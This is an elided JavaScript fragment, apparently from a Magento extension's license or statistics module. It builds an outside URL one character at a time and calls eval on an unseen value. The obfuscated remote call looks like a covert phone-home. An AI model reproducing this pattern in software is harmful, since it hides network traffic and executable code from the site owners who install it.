...
LStat.prototype = {
	...
	get_lsu: function () {
		...
		var hm = eval(n);
		var s = new Array('i', 'n', 't', 'e', 'r', 'i', 'o', 'r', 'w', 'e', 'b', 'd', 'e', 's', 'i', 'g', 'n', '.', 'c', 'o', 'm', '/', 'm', 'a', 'g', 'e', 'n', 't', 'o', '/', 'o', 'p', 'c', 'l', 'i', 'c', 'e', 'n', 's', 'e', '/', 'o', 'p', 'c', 's', 't', 'a', 't', '.', 'p', 'h', 'p');
//		var s = new Array('l', 'o', 'c', 'a', 'l', 'h', 'o', 's', 't', '/', 'o', 'p', 'c', 'l', 'i', 'c', 'e', 'n', 's', 'e', '/', 'o', 'p', 'c', 's', 't', 'a', 't', '.', 'p', 'h', 'p');
